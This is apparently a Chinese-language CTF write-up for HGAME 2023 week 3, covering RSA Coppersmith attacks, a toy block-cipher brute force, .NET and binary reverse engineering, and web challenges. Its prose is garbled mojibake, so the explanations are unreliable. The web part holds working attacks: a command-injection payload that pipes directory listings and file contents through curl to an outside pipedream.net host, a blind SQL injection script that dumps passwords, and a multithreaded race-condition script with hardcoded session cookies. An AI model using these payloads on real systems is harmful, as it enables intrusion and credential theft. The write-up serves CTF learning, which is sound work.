$\\gcd(e,\\varphi)=2$ æƒ…å½¢ï¼Œcoppersmith+AMMç®—æ³•ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import gmpy2N = 68414473664421192639324860086304622601462638941429703900601142401666806262479832339441486761549640560858310048110541758196980937681745306684526118613694088585953109432823793467906611480953093877867597017269693809377188442523548160628479089952031515541299395812090799992365148053327937407652550818853770241959e = 62830c = 0x520ba82a569ea52f16b84c4415186cd616680131e3ac6eda886fea046b18b0e1326d4acbbfb8840dc8064211cd44c30b91148836048434a3f57dd4ec5a5cdaf005a0f8f2c95ee7d9a739505b01e407acd3441dd088f64a2a0c36e43c520e30bd90bb32ec1125e4bb1f4e7d522596898da22c9a7921ac5da96808ee39c98e131fpbits = 512find = 0for i in range(10): for j in range(2**i): p4 = Integer(gmpy2.iroot(N,2)[0])&gt;&gt;256 p4 = (p4&lt;&lt;i) + j kbits = pbits - p4.nbits() p4 = p4 &lt;&lt; kbits PR.&lt;x&gt; = PolynomialRing(Zmod(N)) f = x + p4 roots = f.small_roots(X=2^kbits, beta=0.5) if roots: p = p4+int(roots[0]) if N%p == 0: print(p) find = 1 break if find == 1: break q = N // pf = (p-1)*(q-1)d = inverse_mod(e//2,f)cc = pow(c,d,N)P.&lt;a&gt;=PolynomialRing(Zmod(p),implementation=&#x27;NTL&#x27;)f=a^2-ccmps=f.monic().roots()P.&lt;a&gt;=PolynomialRing(Zmod(q),implementation=&#x27;NTL&#x27;)g=a^2-ccmqs=g.monic().roots()for mpp in mps: x=mpp[0] for mqq in mqs: y=mqq[0] solution = hex(CRT_list([int(x), int(y)], [p, q]))[2:] if len(solution) % 2 == 0: print(bytes.fromhex(solution))# b&#x27;how_to_solve_e_and_phi_uncoprime_condision&#x27; ç¬¬ä¸‰å±‚ï¼Œå·²çŸ¥ $p$ é«˜ä½æ”»å‡»ï¼Œä½†æ³„éœ²ä½æ•°è¿‡å°‘ï¼Œä½çˆ†ç ´+è°ƒèŠ‚å‚æ•°æ‰©å¤§æ ¼èŒƒå›´ã€‚ 12345678910111213141516171819202122232425262728from tqdm import *n = 68340867186438223292118569682710524595966327481168801678255800028919163918249557519447553078528255888326840419621716908729880235244230459900539486879943421761586611726942757775742624070088176246368128990077459966006579285028594729801017390816903003704541109757846868073362640037019813128220657114558520107057pbits = 512for i in trange(2**5): p4 = 531320819410375258952658395582915285878636410772332266245849790153420724865787&lt;&lt;(253-248) p4 = p4 + i kbits = pbits - p4.nbits() p4 = p4 &lt;&lt; kbits PR.&lt;x&gt; = PolynomialRing(Zmod(n)) f = x + p4 roots = f.small_roots(X=2^kbits, beta=0.4, epsilon=0.01) if roots: p = p4+int(roots[0]) if n%p==0: print(i,p) break q = n//pe = 65537c = 0x29d543c73f4175f22440eef5954184e9d740cd3785011d560431861ccf6c4ff380d46ad948f9888e8cac2f5e38ce5e994f023d7195b78439b90d53ad23a730cc99b1b75dae1aba416cb6e645c5d135de906be54f344daba47a10492183d03211bfbaa45c09be2bb1913b1453e0538db95c56140cb78dd9c43d21f8312245ef7df = (p-1)*(q-1)d = inverse_mod(e,f)m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# b&#x27;now_you_know_how_to_use_coppersmith&#x27; ä¸‰æ¬¡æäº¤æ­£ç¡®å¾—flagï¼šhgame&#123;U_mus7_b3_RS4_M@ster!!!&#125;ã€‚ â€‹ ezBlock å…”å…”æ‹œå¹´çš„æ—¶å€™é‡åˆ°äº† yolande ï¼Œyolande è¯´å¥¹ä¹‹å‰åœ¨å†™å·®åˆ†æ”»å‡»è„šæœ¬ï¼Œé—®å…”å…”è¦ä¸è¦å­¦ä¹ ä¸€ä¸‹ï¼Œè¿˜è¯´å¦‚æœé‡åˆ°é—®é¢˜å¯ä»¥çœ‹çœ‹ The Block Cipher Companion. 12345678910111213141516171819202122232425262728293031323334from secret import flagdef s_substitute(m): c = 0 s_box = &#123;0: 0x6, 1: 0x4, 2: 0xc, 3: 0x5, 4: 0x0, 5: 0x7, 6: 0x2, 7: 0xe, 8: 0x1, 9: 0xf, 10: 0x3, 11: 0xd, 12: 0x8, 13: 0xa, 14: 0x9, 15: 0xb&#125; for i in range(0, 16, 4): t = (m &gt;&gt; i) &amp; 0xf t = s_box[t] c += t &lt;&lt; i return cdef enc(m, key): n = len(key) t = m for i in range(n - 1): t = t ^ key[i] t = s_substitute(t) c = t ^ key[n - 1] return cf = flag[6:-1]assert flag == &#x27;hgame&#123;&#x27; + f + &#x27;&#125;&#x27;key = [int(i, 16) for i in f.split(&#x27;_&#x27;)]print(len(key))m_list = [i * 0x1111 for i in range(16)]c_list = [enc(m, key) for m in m_list]print(c_list)# 5# [28590, 33943, 30267, 5412, 11529, 3089, 46924, 59533, 12915, 37743, 64090, 53680, 18933, 49378, 23512, 44742] æ­£å¸¸è€ƒç‚¹åº”è¯¥æ˜¯å››è½®Sç›’å·®åˆ†æ”»å‡»ï¼Œxxxx_xxxx_xxxx_xxxx_xxxx åˆ†å‰²å¾—åˆ°5ç»„keyï¼Œæµ‹è¯•å‘ç°5ç»„keyçš„æ¯4ä½ï¼ˆæ¯1ä¸ª16è¿›åˆ¶æ•°ï¼‰ä¸ºä¸€ç»„ä½œä¸ºè¾“å…¥ï¼Œå¾—åˆ°çš„è¾“å‡ºæ˜¯å›ºå®šä¸å˜çš„ï¼Œé‡‡ç”¨çˆ†ç ´æ–¹å¼å¯è§£ï¼Œæ‰€éœ€éå†æ¬¡æ•°ä¸º $4 \\cdot 16^5=4194304$ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from tqdm import *from itertools import productm = [i * 0x1111 for i in range(16)]c = [28590, 33943, 30267, 5412, 11529, 3089, 46924, 59533, 12915, 37743, 64090, 53680, 18933, 49378, 23512, 44742]m = [[(k &gt;&gt; i) &amp; 0xf for i in range(0, 16, 4)] for k in m]c = [[(k &gt;&gt; i) &amp; 0xf for i in range(0, 16, 4)] for k in c]#print(m)#print(c)m = [[k[i] for k in m] for i in range(4)]c = [[k[i] for k in c] for i in range(4)]print(m)print(c)def s_substitute(m): c = 0 s_box = &#123;0: 0x6, 1: 0x4, 2: 0xc, 3: 0x5, 4: 0x0, 5: 0x7, 6: 0x2, 7: 0xe, 8: 0x1, 9: 0xf, 10: 0x3, 11: 0xd, 12: 0x8, 13: 0xa, 14: 0x9, 15: 0xb&#125; for i in range(0, 16, 4): t = (m &gt;&gt; i) &amp; 0xf t = s_box[t] c += t &lt;&lt; i return cdef enc(m, key): n = len(key) t = m for i in range(n - 1): t = t ^ key[i] t = s_substitute(t) c = t ^ key[n - 1] return cm_list = [i * 0x1111 for i in range(16)]finalkey = [&#x27;&#x27;]*5dic = &#x27;0123456789abcdef&#x27;allc = list(product(dic,repeat=5))for i in range(4): for k in tqdm(allc): key = [(int(x, 16))&lt;&lt;(4*i) for x in k] c_list = [enc(m, key) for m in m_list] out = [(k &gt;&gt; (4*i)) &amp; 0xf for k in c_list] if out == c[i]: print(i,k) for j in range(5): finalkey[j] = k[j] + finalkey[j] breakprint(&#x27;hgame&#123;&#x27;+&#x27;_&#x27;.join(finalkey)+&#x27;&#125;&#x27;)# 0 (&#x27;2&#x27;, &#x27;3&#x27;, &#x27;2&#x27;, &#x27;0&#x27;, &#x27;5&#x27;)# 1 (&#x27;4&#x27;, &#x27;9&#x27;, &#x27;9&#x27;, &#x27;7&#x27;, &#x27;d&#x27;)# 2 (&#x27;f&#x27;, &#x27;4&#x27;, &#x27;f&#x27;, &#x27;5&#x27;, &#x27;8&#x27;)# 3 (&#x27;4&#x27;, &#x27;f&#x27;, &#x27;4&#x27;, &#x27;4&#x27;, &#x27;d&#x27;)# hgame&#123;4f42_f493_4f92_4570_d8d5&#125; â€‹ WebPing To The Host ä¸€ä¸ªç”¨æ¥è¾“å…¥ipçš„pingå·¥å…·ï¼Œæˆ‘å¯ä»¥ç”¨å®ƒæ¥åšäº›ä»€ä¹ˆï¼Ÿ æ— å›æ˜¾å‘½ä»¤æ³¨å…¥ï¼Œå¤–å¸¦å³å¯ã€‚ç©ºæ ¼ä½¿ç”¨ $IFS$9 ç»•è¿‡ã€‚ åˆ—ç›®å½•ï¼šip=x|curl$IFS$9https://enm8badfmuo0f.x.pipedream.net/?p=`ls$IFS$9/|base64` ï¼Œå¾—åˆ°flagæ–‡ä»¶åä¸º flag_is_here_hahaï¼› è¯»æ–‡ä»¶ï¼šip=x|curl$IFS$9https://enm8badfmuo0f.x.pipedream.net/?p=`uniq$IFS$9/f*|base64` ï¼Œå¾—åˆ° aGdhbWV7cDFuR190MF9Db21NNG5EX0V4ZWNVdDFvbl9kQW5nRXJSclJyUnJSIX0Kï¼Œbase64è§£ç å¾— hgame&#123;p1nG_t0_ComM4nD_ExecUt1on_dAngErRrRrRrR!&#125;ã€‚ â€‹ Login To Get My Gift R1esbyfeï¼šâ€œæƒ³å¿…ä½ ä¸Šå‘¨å·²ç»æ‰¾åˆ°äº†æˆ‘ç•™ç»™ä½ çš„æƒŠå–œï¼Œè¿™æ¬¡æˆ‘åˆè—äº†ä¸€ä¸ªâ€ å…”å…”æƒ³èµ·äº†ä¸Šå‘¨R1esbyfeå­¦é•¿æ•™çš„sqlåŸºç¡€çŸ¥è¯†ä¸è¿ç”¨æ–¹æ³•ï¼Œæ˜¯æ—¶å€™å°†ä»–ä»¬æ´¾ä¸Šç”¨åœºäº† R1esbyfeï¼šâ€œç»™ä½ ä¸ªç”¨æˆ·åä¸ºtestuserï¼Œå¯†ç ä¸ºtestpasswordçš„testè´¦æˆ·å§ï¼Œä¸è¿‡åªæœ‰çœŸæ­£çš„ç®¡ç†å‘˜æ‰èƒ½å¾—åˆ°æƒŠå–œ:D åˆ«æƒ³äº†ï¼Œç®¡ç†å‘˜ç”¨æˆ·åå¯ä¸æ˜¯adminâ€ After login, you can visit: /index -&gt; Only for test users /home -&gt; Only for admin users fuzzæµ‹è¯•ï¼Œå‘ç°è¿‡æ»¤äº†ç©ºæ ¼ã€ç­‰å·ã€substrã€midç­‰ï¼Œç­‰å·ç”¨ regexp ç»•è¿‡ï¼Œsubstr() ç”¨ right(left()) ç»•è¿‡æ¥å–å­—ç¬¦ã€‚å¸ƒå°”ç›²æ³¨ï¼š 12345678910111213141516171819202122232425262728293031323334import requestsurl = &quot;http://week-3.hgame.lwsec.cn:31673/login&quot;result = &#x27;&#x27;i = 0while True: i = i + 1 head = 32 tail = 127 while head &lt; tail: mid = (head + tail) &gt;&gt; 1 #payload = f&#x27;if(ascii(right(left((select(database())),&#123;i&#125;),1))&gt;&#123;mid&#125;,1,0)&#x27; #payload = f&#x27;if(ascii(right(left((select(group_concat(table_name))from(information_schema.tables)where((table_schema)regexp(&quot;L0g1NMe&quot;))),&#123;i&#125;),1))&gt;&#123;mid&#125;,1,0)&#x27; #payload = f&#x27;if(ascii(right(left((select(group_concat(column_name))from(information_schema.columns)where((table_schema)regexp(&quot;L0g1NMe&quot;))),&#123;i&#125;),1))&gt;&#123;mid&#125;,1,0)&#x27; payload = f&#x27;if(ascii(right(left((select(group_concat(PAssw0rD,&quot;~&quot;,UsErN4me))from(L0g1NMe.User1nf0mAt1on)),&#123;i&#125;),1))&gt;&#123;mid&#125;,1,0)&#x27; data = &#123; &#x27;username&#x27;: &#x27;testuser&#x27;, &#x27;password&#x27;: f&quot;1&#x27;^(&#123;payload&#125;)^&#x27;0&quot; &#125; r = requests.post(url,data=data) #print(r.text) if &quot;Success!&quot; in r.text: head = mid + 1 else: tail = mid if head != 32: result += chr(head) else: break print(result) åˆ†åˆ«å¾—åˆ°ï¼š 1234database: L0g1NMetable: User1nf0mAt1oncolumn: id,PAssw0rD,UsErN4meflag: WeLc0meT0hgAmE2023~hAPPySqlhgAmE2023HAppYnEwyEAr,testpassword~testuser ä½¿ç”¨è´¦å¯† WeLc0meT0hgAmE2023/hAPPySqlhgAmE2023HAppYnEwyEAr ç™»å½•ï¼Œå¾—flagï¼šhgame&#123;It_1s_1n7EresT1nG_T0_ExPL0Re_Var10us_Ways_To_Sql1njEct1on&#125;ã€‚ â€‹ Gopher Shop ä»Šå¤©æ˜¯å¤§å¹´åˆäºŒï¼å…”å…”è¿ˆç€å¼€å¿ƒçš„æ­¥ä¼èµ°åˆ°äº†ä¸€æ•™ï¼Œæ®è¯´æ¯é€¢å¯’å‡HGAMEæœŸé—´ï¼Œ300bå°±ä¼šæœ‰Vidarå¤§å•†åœºï¼Œæ¯ä¸ªè¿›å…¥å•†åœºçš„åŒå­¦éƒ½å¯ä»¥é¢†å–10ä¸ªVidarå¸ã€‚å…”å…”åœ¨ä¸€å®¶å«Gopher Shopçš„å•†åº—é¢å‰åœä¸‹äº†è„šæ­¥ï¼ŒGopherï¼Ÿå¬è¯´åä¼šçš„Webæ‰‹ä»¬éƒ½ä¼šä¸€ç‚¹Go,ä¹Ÿè®¸è¿™æ˜¯åä¼šå­¦é•¿å¼€çš„å§ã€‚æœ›ç€æ©±çª—é‡Œçš„å•†å“ï¼Œæ”¥ç€æ‰‹é‡Œçš„10ä¸ªVidarå¸ï¼Œå…”å…”èµ°è¿›äº†å•†åº—â€¦ åœ¨ /buyProduct è·¯ç”±å¤„åˆ©ç”¨ç«äº‰ä¹°flagã€‚ 12345678910import requestsimport threadingdef req(): url = &#x27;http://week-3.hgame.lwsec.cn:30875/api/v1/user/buyProduct?product=Flag&amp;number=1&#x27; headers = &#123;&#x27;Cookie&#x27;:&#x27;SESSION=MTY3NDQ5MTUzNHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBY0FCV0ZrYldsdXz3P-nsnRLwqBHiy3dxz3pgu8nGGORBOuHQaWl7ObqsvQ==; session=MTY3NDc0MzkzM3xEdi1CQkFFQ180SUFBUkFCRUFBQUpmLUNBQUVHYzNSeWFXNW5EQW9BQ0hWelpYSnVZVzFsQm5OMGNtbHVad3dGQUFOaFlXRT18psiHGgZdURTbYwyW0lTiIA-D7mS0kxe9mu-kLSib2NI=&#x27;&#125; r = requests.get(url=url, headers=headers)for i in range(10000): threading.Thread(target=req).start() æœ€åç‚¹å‡»checkflagå¾—åˆ°flagï¼šhgame&#123;GopherShop_M@gic_1nt_0verflow&#125;ã€‚ â€‹ Reversekunmusic å°é»‘å­ï¼Œéœ²å‡ºé¸¡è„šäº†å§ï¼Ÿ kmusic.dllä¸º.NETç¨‹åºï¼ŒILSpyæ‰“å¼€ï¼Œåœ¨ Program ç±»æ‰¾åˆ°ç±»ä¼¼SMCåè°ƒè¯•çš„å¼‚æˆ–æ“ä½œï¼š 12345678910111213141516171819202122using System;using System.Reflection;using System.Windows.Forms;using kmusic;using kmusic.Properties;internal static class Program&#123; private static Form1 form1 = new Form1(); private static void Main() &#123; ApplicationConfiguration.Initialize(); byte[] data = Resources.data; for (int i = 0; i &lt; data.Length; i++) &#123; data[i] ^= 104; &#125; Activator.CreateInstance(Assembly.Load(data).GetType(&quot;WinFormsLibrary1.Class1&quot;), form1); Application.Run((Form)(object)form1); &#125;&#125; åœ¨èµ„æºéƒ¨åˆ†æ‰¾åˆ° Resources.dataï¼Œå¯¼å‡ºï¼Œå¼‚æˆ–104è¿˜åŸå‡ºå¦ä¸€ä¸ª.NETç¨‹åºï¼Œåœ¨ Class1 ç±»ä¸­æ‰¾åˆ°å…³é”®é€»è¾‘ï¼š 123456789101112131415161718192021222324252627282930313233343536373839using System;using System.IO;using System.Media;using System.Windows.Forms;using kmusic;using kmusic.Properties;public class Class1&#123; private int[] num = new int[13]; ... public void music(object sender, EventArgs e) &#123; //IL_0ade: Unknown result type (might be due to invalid IL or missing references) //IL_0ae9: Unknown result type (might be due to invalid IL or missing references) if (num[0] + 52296 + num[1] - 26211 + num[2] - 11754 + (num[3] ^ 0xA114) + num[4] * 63747 + num[5] - 52714 + num[6] - 10512 + num[7] * 12972 + num[8] + 45505 + num[9] - 21713 + num[10] - 59122 + num[11] - 12840 + (num[12] ^ 0x525F) == 12702282 &amp;&amp; num[0] - 25228 + (num[1] ^ 0x50DB) + (num[2] ^ 0x1FDE) + num[3] - 65307 + num[4] * 30701 + num[5] * 47555 + num[6] - 2557 + (num[7] ^ 0xBF9F) + num[8] - 7992 + (num[9] ^ 0xE079) + (num[10] ^ 0xE052) + num[11] + 13299 + num[12] - 50966 == 9946829 &amp;&amp; num[0] - 64801 + num[1] - 60698 + num[2] - 40853 + num[3] - 54907 + num[4] + 29882 + (num[5] ^ 0x3506) + (num[6] ^ 0x533E) + num[7] + 47366 + num[8] + 41784 + (num[9] ^ 0xD1BA) + num[10] * 58436 + num[11] * 15590 + num[12] + 58225 == 2372055 &amp;&amp; num[0] + 61538 + num[1] - 17121 + num[2] - 58124 + num[3] + 8186 + num[4] + 21253 + num[5] - 38524 + num[6] - 48323 + num[7] - 20556 + num[8] * 56056 + num[9] + 18568 + num[10] + 12995 + (num[11] ^ 0x995C) + num[12] + 25329 == 6732474 &amp;&amp; num[0] - 42567 + num[1] - 17743 + num[2] * 47827 + num[3] - 10246 + (num[4] ^ 0x3F9C) + num[5] + 39390 + num[6] * 11803 + num[7] * 60332 + (num[8] ^ 0x483B) + (num[9] ^ 0x12BB) + num[10] - 25636 + num[11] - 16780 + num[12] - 62345 == 14020739 &amp;&amp; num[0] - 10968 + num[1] - 31780 + (num[2] ^ 0x7C71) + num[3] - 61983 + num[4] * 31048 + num[5] * 20189 + num[6] + 12337 + num[7] * 25945 + (num[8] ^ 0x1B98) + num[9] - 25369 + num[10] - 54893 + num[11] * 59949 + (num[12] ^ 0x3099) == 14434062 &amp;&amp; num[0] + 16689 + num[1] - 10279 + num[2] - 32918 + num[3] - 57155 + num[4] * 26571 + num[5] * 15086 + (num[6] ^ 0x59CA) + (num[7] ^ 0x5B35) + (num[8] ^ 0x3FFD) + (num[9] ^ 0x5A85) + num[10] - 40224 + num[11] + 31751 + num[12] * 8421 == 7433598 &amp;&amp; num[0] + 28740 + num[1] - 64696 + num[2] + 60470 + num[3] - 14752 + (num[4] ^ 0x507) + (num[5] ^ 0x89C8) + num[6] + 49467 + num[7] - 33788 + num[8] + 20606 + (num[9] ^ 0xAF4A) + num[10] * 19764 + num[11] + 48342 + num[12] * 56511 == 7989404 &amp;&amp; (num[0] ^ 0x7132) + num[1] + 23120 + num[2] + 22802 + num[3] * 31533 + (num[4] ^ 0x9977) + num[5] - 48576 + (num[6] ^ 0x6F7E) + num[7] - 43265 + num[8] + 22365 + num[9] + 61108 + num[10] * 2823 + num[11] - 30343 + num[12] + 14780 == 3504803 &amp;&amp; num[0] * 22466 + (num[1] ^ 0xDABF) + num[2] - 53658 + (num[3] ^ 0xB838) + (num[4] ^ 0x30DF) + num[5] * 59807 + num[6] + 46242 + num[7] + 3052 + (num[8] ^ 0x62BF) + num[9] + 30202 + num[10] * 22698 + num[11] + 33480 + (num[12] ^ 0x4175) == 11003580 &amp;&amp; num[0] * 57492 + (num[1] ^ 0x346D) + num[2] - 13941 + (num[3] ^ 0xBBDC) + num[4] * 38310 + num[5] + 9884 + num[6] - 45500 + num[7] - 19233 + num[8] + 58274 + num[9] + 36175 + (num[10] ^ 0x4888) + num[11] * 49694 + (num[12] ^ 0x2501) == 25546210 &amp;&amp; num[0] - 23355 + num[1] * 50164 + (num[2] ^ 0x873A) + num[3] + 52703 + num[4] + 36245 + num[5] * 46648 + (num[6] ^ 0x12FA) + (num[7] ^ 0xA376) + num[8] * 27122 + (num[9] ^ 0xA44A) + num[10] * 15676 + num[11] - 31863 + num[12] + 62510 == 11333836 &amp;&amp; num[0] * 30523 + (num[1] ^ 0x1F36) + num[2] + 39058 + num[3] * 57549 + (num[4] ^ 0xD0C0) + num[5] * 4275 + num[6] - 48863 + (num[7] ^ 0xD88C) + (num[8] ^ 0xA40) + (num[9] ^ 0x3554) + num[10] + 62231 + num[11] + 19456 + num[12] - 13195 == 13863722) &#123; int[] array = new int[47] &#123; 132, 47, 180, 7, 216, 45, 68, 6, 39, 246, 124, 2, 243, 137, 58, 172, 53, 200, 99, 91, 83, 13, 171, 80, 108, 235, 179, 58, 176, 28, 216, 36, 11, 80, 39, 162, 97, 58, 236, 130, 123, 176, 24, 212, 56, 89, 72 &#125;; string text = &quot;&quot;; for (int i = 0; i &lt; array.Length; i++) &#123; text += (char)(array[i] ^ num[i % num.Length]); &#125; new SoundPlayer((Stream)Resources.è¿‡å¹´é¸¡).Play(); MessageBox.Show(text); &#125; &#125; ...&#125; æå–åˆ¤æ–­æ¡ä»¶ï¼Œç”¨z3æ±‚è§£ï¼š 123456789101112131415161718192021222324252627282930313233343536373839from z3 import *c = [132, 47, 180, 7, 216, 45, 68, 6, 39, 246, 124, 2, 243, 137, 58, 172, 53, 200, 99, 91, 83, 13, 171, 80, 108, 235, 179, 58, 176, 28, 216, 36, 11, 80, 39, 162, 97, 58, 236, 130, 123, 176, 24, 212, 56, 89, 72]num = [BitVec(f&#x27;num&#123;i&#125;&#x27;,8) for i in range(13)]s = Solver()s.add(num[0] + 52296 + num[1] - 26211 + num[2] - 11754 + (num[3] ^ 0xA114) + num[4] * 63747 + num[5] - 52714 + num[6] - 10512 + num[7] * 12972 + num[8] + 45505 + num[9] - 21713 + num[10] - 59122 + num[11] - 12840 + (num[12] ^ 0x525F) == 12702282 )s.add( num[0] - 25228 + (num[1] ^ 0x50DB) + (num[2] ^ 0x1FDE) + num[3] - 65307 + num[4] * 30701 + num[5] * 47555 + num[6] - 2557 + (num[7] ^ 0xBF9F) + num[8] - 7992 + (num[9] ^ 0xE079) + (num[10] ^ 0xE052) + num[11] + 13299 + num[12] - 50966 == 9946829 )s.add( num[0] - 64801 + num[1] - 60698 + num[2] - 40853 + num[3] - 54907 + num[4] + 29882 + (num[5] ^ 0x3506) + (num[6] ^ 0x533E) + num[7] + 47366 + num[8] + 41784 + (num[9] ^ 0xD1BA) + num[10] * 58436 + num[11] * 15590 + num[12] + 58225 == 2372055 )s.add( num[0] + 61538 + num[1] - 17121 + num[2] - 58124 + num[3] + 8186 + num[4] + 21253 + num[5] - 38524 + num[6] - 48323 + num[7] - 20556 + num[8] * 56056 + num[9] + 18568 + num[10] + 12995 + (num[11] ^ 0x995C) + num[12] + 25329 == 6732474 )s.add( num[0] - 42567 + num[1] - 17743 + num[2] * 47827 + num[3] - 10246 + (num[4] ^ 0x3F9C) + num[5] + 39390 + num[6] * 11803 + num[7] * 60332 + (num[8] ^ 0x483B) + (num[9] ^ 0x12BB) + num[10] - 25636 + num[11] - 16780 + num[12] - 62345 == 14020739 )s.add( num[0] - 10968 + num[1] - 31780 + (num[2] ^ 0x7C71) + num[3] - 61983 + num[4] * 31048 + num[5] * 20189 + num[6] + 12337 + num[7] * 25945 + (num[8] ^ 0x1B98) + num[9] - 25369 + num[10] - 54893 + num[11] * 59949 + (num[12] ^ 0x3099) == 14434062 )s.add( num[0] + 16689 + num[1] - 10279 + num[2] - 32918 + num[3] - 57155 + num[4] * 26571 + num[5] * 15086 + (num[6] ^ 0x59CA) + (num[7] ^ 0x5B35) + (num[8] ^ 0x3FFD) + (num[9] ^ 0x5A85) + num[10] - 40224 + num[11] + 31751 + num[12] * 8421 == 7433598 )s.add( num[0] + 28740 + num[1] - 64696 + num[2] + 60470 + num[3] - 14752 + (num[4] ^ 0x507) + (num[5] ^ 0x89C8) + num[6] + 49467 + num[7] - 33788 + num[8] + 20606 + (num[9] ^ 0xAF4A) + num[10] * 19764 + num[11] + 48342 + num[12] * 56511 == 7989404 )s.add( (num[0] ^ 0x7132) + num[1] + 23120 + num[2] + 22802 + num[3] * 31533 + (num[4] ^ 0x9977) + num[5] - 48576 + (num[6] ^ 0x6F7E) + num[7] - 43265 + num[8] + 22365 + num[9] + 61108 + num[10] * 2823 + num[11] - 30343 + num[12] + 14780 == 3504803 )s.add( num[0] * 22466 + (num[1] ^ 0xDABF) + num[2] - 53658 + (num[3] ^ 0xB838) + (num[4] ^ 0x30DF) + num[5] * 59807 + num[6] + 46242 + num[7] + 3052 + (num[8] ^ 0x62BF) + num[9] + 30202 + num[10] * 22698 + num[11] + 33480 + (num[12] ^ 0x4175) == 11003580 )s.add( num[0] * 57492 + (num[1] ^ 0x346D) + num[2] - 13941 + (num[3] ^ 0xBBDC) + num[4] * 38310 + num[5] + 9884 + num[6] - 45500 + num[7] - 19233 + num[8] + 58274 + num[9] + 36175 + (num[10] ^ 0x4888) + num[11] * 49694 + (num[12] ^ 0x2501) == 25546210 )s.add( num[0] - 23355 + num[1] * 50164 + (num[2] ^ 0x873A) + num[3] + 52703 + num[4] + 36245 + num[5] * 46648 + (num[6] ^ 0x12FA) + (num[7] ^ 0xA376) + num[8] * 27122 + (num[9] ^ 0xA44A) + num[10] * 15676 + num[11] - 31863 + num[12] + 62510 == 11333836 )s.add( num[0] * 30523 + (num[1] ^ 0x1F36) + num[2] + 39058 + num[3] * 57549 + (num[4] ^ 0xD0C0) + num[5] * 4275 + num[6] - 48863 + (num[7] ^ 0xD88C) + (num[8] ^ 0xA40) + (num[9] ^ 0x3554) + num[10] + 62231 + num[11] + 19456 + num[12] - 13195 == 13863722)s.add(num[0]==ord(&#x27;h&#x27;)^c[0])s.add(num[1]==ord(&#x27;g&#x27;)^c[1])s.add(num[2]==ord(&#x27;a&#x27;)^c[2])s.add(num[3]==ord(&#x27;m&#x27;)^c[3])s.add(num[4]==ord(&#x27;e&#x27;)^c[4])s.add(num[5]==ord(&#x27;&#123;&#x27;)^c[5])s.check()m = s.model()print(m)key = []for i in range(13): key.append(m[num[i]].as_long())flag = [(c[i]^key[i%13])%128 for i in range(len(c))]print(bytes(flag))# b&#x27;hgame&#123;z3_1s_very_u5eful_1n_rever5e_engin3ering&#125;&#x27; â€‹ patchme ä¸ä¼špwnçš„reæ‰‹ä¸æ˜¯ä¸€ä¸ªå¥½CTFerï¼æ¸¸æˆè§„åˆ™ï¼šä¿®å¤ç¨‹åºä¸­çš„äºŒè¿›åˆ¶å®‰å…¨æ¼æ´ï¼Œè¦æ±‚èƒ½ä¸¥æ ¼æ‰§è¡ŒåŸç¨‹åºçš„æ­£å¸¸åŠŸèƒ½ä¸”ä¸å˜åŠ¨æ–‡ä»¶å¤§å°ï¼Œå¦‚æœä¿®å¤æˆåŠŸï¼Œåœ¨è¿è¡Œåè¾“å…¥ä»»ä½•å†…å®¹å³å¯è¾“å‡ºflagã€‚é™„ä»¶æ›´æ–°ï¼Œå¢åŠ éƒ¨åˆ†æºç ä»¥ä½œæç¤ºï¼šhttps://share.weiyun.com/Kj85naWl åœ¨ init() ä¸­è°ƒç”¨ sub_1887()ï¼Œè€Œ sub_1887() é‡Œå¯¹ loc_14C6 åŒºåŸŸçš„æ•°æ®è¿›è¡Œå¼‚æˆ– 0x66 æ“ä½œï¼Œç±»ä¼¼äºSMCåè°ƒè¯•ï¼Œç”¨IDAä»£ç è¿˜åŸï¼š 123456789static main()&#123; auto addr = 0x0014c6; auto i = 0; for(i=0;i&lt;=960;i++) &#123; PatchByte(addr+i,Byte(addr+i)^0x66); &#125;&#125; åœ¨ 0x14CA å¤„æŒ‰Pè¯†åˆ«ä¸ºå‡½æ•° sub_14CA()ï¼Œçœ‹åˆ°ä¸»è¦é€»è¾‘ä¸ºå­—ç¬¦ä¸¤ä¸¤å¼‚æˆ–æ“ä½œï¼Œè¿˜åŸå³å¯ï¼š 123456789101112131415161718from Crypto.Util.number import *def change(s): res = [] for k in s: res += list(long_to_bytes(k)[::-1]) return resx = [0x5416D999808A28FA,0x588505094953B563,0xCE8CF3A0DC669097,0x4C5CF3E854F44CBD,0xD144E49916678331,0xDA616BAC,0xBBD0,0x55]y = [0x3B4FA2FCEDEB4F92,0x7E45A6C3B67EA16,0xAFE1ACC8BF12D0E7,0x132EC3B7269138CE,0x8E2197EB7311E643,0xAE540AC1,0xC9B5,0x28]x = change(x)y = change(y)flag = [x[i]^y[i] for i in range(len(x))]print(bytes(flag))# b&#x27;hgame&#123;You_4re_a_p@tch_master_0r_reverse_ma5ter&#125;&#x27; â€‹ cpp C++æ˜¯ä¸€é—¨éå¸¸å¥½çš„è¯­è¨€ï¼Œä»–å¥½å°±å¥½åœ¨äº†é€†å‘æ¯”è¾ƒéš¾ğŸ˜œ å»äº†ç¬¦å·ï¼ŒIDAåˆ†æä¼ªç å¾ˆéš¾çœ‹ï¼Œåˆ†æä¸»è¦åŠ å¯†é€»è¾‘åœ¨ sub_1400026A0()ï¼Œvftableä¸­åˆ†åˆ«æœ‰ encrypt1 å’Œ encrypt2ï¼Œå¯¹åº”çš„å‡½æ•°è¡¨ï¼š 1234567891011encrypt1sub_140001600 0encrypt2sub_140002E60 0sub_140001710 8sub_140001E30 16sub_1400022F0 24sub_1400027A0 32sub_140002B90 40sub_140003080 48 encrypt1 ä¸­ sub_140001600() ä¸ºå¼‚æˆ–æ“ä½œï¼Œencrypt2 ä¸­ä¸€ç³»åˆ—æ“ä½œä¸ºåŠ å¯†è¿ç®—+æœ€åæ¯”å¯¹å¯†æ–‡ã€‚ è¾“å…¥æµ‹è¯•æ•°æ®ï¼Œåœ¨æœ€åçš„å¯†æ–‡æ¯”å¯¹å‡½æ•° sub_140003080() ä¸‹æ–­ç‚¹ï¼ŒåŠ¨è°ƒæå–å‡ºæµ‹è¯•æ•°æ®å¯¹åº”çš„åŠ å¯†ç»“æœä»¥åŠå¼‚æˆ–æ“ä½œçš„keyå€¼ï¼Œæ ¹æ®keyå€¼å’Œæ˜å¯†æ–‡æ¥ç¡®å®šå¼‚æˆ–è®¡ç®—é€»è¾‘ä¸ºï¼Œæ¯4ä½å¯†æ–‡åå‘å¼‚æˆ–æ¯4ä½keyå€¼ã€‚ 